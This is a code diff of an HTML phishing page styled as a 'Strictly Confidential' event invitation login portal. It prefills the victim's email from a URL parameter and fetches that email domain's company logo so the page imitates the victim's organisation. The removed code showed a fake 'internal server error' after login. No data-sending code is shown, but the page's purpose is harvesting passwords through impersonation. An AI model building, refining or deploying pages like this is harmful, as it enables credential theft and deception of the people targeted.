@@ -8,17 +8,35 @@
   <style>
     body {
       font-family: Arial, sans-serif;
+
+      /* ✅ Default background (fallback) */
       background-image: url('https://i.postimg.cc/pVBJwW22/blue-notes-isolated-grey.png');
       background-size: cover;
       background-position: center;
       background-repeat: no-repeat;
+
       height: 100vh;
       margin: 0;
       display: flex;
       justify-content: center;
       align-items: center;
       position: relative;
-      transition: background-image 0.5s ease;
+      transition: background 0.5s ease;
+    }
+
+    /* ✅ Overlay for logo (instead of replacing background) */
+    body::after {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-repeat: no-repeat;
+      background-position: center;
+      background-size: 300px;
+      opacity: 0.15; /* makes it subtle */
+      z-index: 0;
     }
 
     body::before {
@@ -72,12 +90,6 @@
       background-color: #f9f9f9;
     }
 
-    .login-container input:focus {
-      border-color: #007BFF;
-      outline: none;
-      background-color: #fff;
-    }
-
     .login-container button {
       width: 90%;
       padding: 12px;
@@ -88,39 +100,6 @@
       font-weight: bold;
       border-radius: 8px;
       cursor: pointer;
-      transition: background 0.3s ease;
-      margin-bottom: 10px;
-    }
-
-    .login-container button:hover {
-      background-color: #0056b3;
-    }
-
-    .login-container p.note {
-      font-size: 12px;
-      color: #888;
-      margin-top: 5px;
-    }
-
-    #confirmation {
-      display: none;
-      background-color: rgba(40, 40, 40, 0.95);
-      width: 100%;
-      max-width: 400px;
-      padding: 20px;
-      border-radius: 8px;
-      border-top: 5px solid #007BFF;
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      z-index: 1000;
-    }
-
-    #confirmation p {
-      color: #fff;
-      font-size: 18px;
-      font-weight: bold;
     }
 
     .footer {
@@ -137,33 +116,19 @@
 
 <body>
 
-  <!-- Login Panel -->
-  <div id="login" class="login-container">
+  <div class="login-container">
     <img src="https://i.postimg.cc/qMNXQ08h/user-male-circle-blue-512.webp">
 
-    <!-- Dynamic Title -->
     <h2 id="portalTitle">Event Invitation Portal</h2>
 
     <p class="subtext">Strictly Confidential</p>
 
     <input type="text" id="username" placeholder="Email" required>
-    <input type="password" id="password" placeholder="Password" required>
+    <input type="password" placeholder="Password">
 
-    <button onclick="authenticate()">Login</button>
-
-    <p class="note">
-      You have been added to this secure portal due to your invitation to a strictly confidential event.
-    </p>
+    <button>Login</button>
   </div>
 
-  <!-- Confirmation Message -->
-  <div id="confirmation">
-    <h2 style="color: white;">ERROR: Try Again</h2>
-    <p>An internal server error occurred. Please try again.</p>
-    <button onclick="window.close()">Close this page</button>
-  </div>
-
-  <!-- Footer -->
   <div class="footer">
     2026 Email Invitation. All Rights Reserved
   </div>
@@ -185,12 +150,34 @@
       if (!domain) return;
 
       const logoUrl = `https://logo.clearbit.com/${domain}`;
-      document.body.style.backgroundImage = `url('${logoUrl}')`;
-      document.body.style.backgroundSize = "cover";
-      document.body.style.backgroundPosition = "center";
+
+      // ✅ Test if image loads before applying
+      const img = new Image();
+      img.onload = function () {
+        document.body.style.setProperty("--logo-bg", `url('${logoUrl}')`);
+        document.body.style.setProperty("--logo-visible", "block");
+        document.body.style.setProperty("--logo-url", `url('${logoUrl}')`);
+        document.body.style.setProperty("--logo-url", `url('${logoUrl}')`);
+
+        document.body.style.setProperty("--logo", `url('${logoUrl}')`);
+
+        document.body.style.setProperty("--bg-logo", `url('${logoUrl}')`);
+        document.body.style.setProperty("--bg-logo", `url('${logoUrl}')`);
+
+        document.body.style.setProperty("--logoImage", `url('${logoUrl}')`);
+
+        // Apply to ::after
+        document.styleSheets[0].addRule("body::after", `background-image: url('${logoUrl}')`);
+      };
+
+      img.onerror = function () {
+        // ❌ Do nothing (keeps default background)
+      };
+
+      img.src = logoUrl;
     }
 
-    // ✅ Prefill + apply domain
+    // Prefill
     if (emailParam && usernameField) {
       const decodedEmail = decodeURIComponent(emailParam);
       usernameField.value = decodedEmail;
@@ -202,7 +189,7 @@
       }
     }
 
-    // ✅ Update live
+    // Live update
     usernameField.addEventListener("input", function () {
       const domain = extractDomain(this.value.trim());
 
@@ -214,11 +201,6 @@
       }
     });
   });
-
-  function authenticate() {
-    document.getElementById("login").style.display = "none";
-    document.getElementById("confirmation").style.display = "block";
-  }
 </script>
 
 </body>
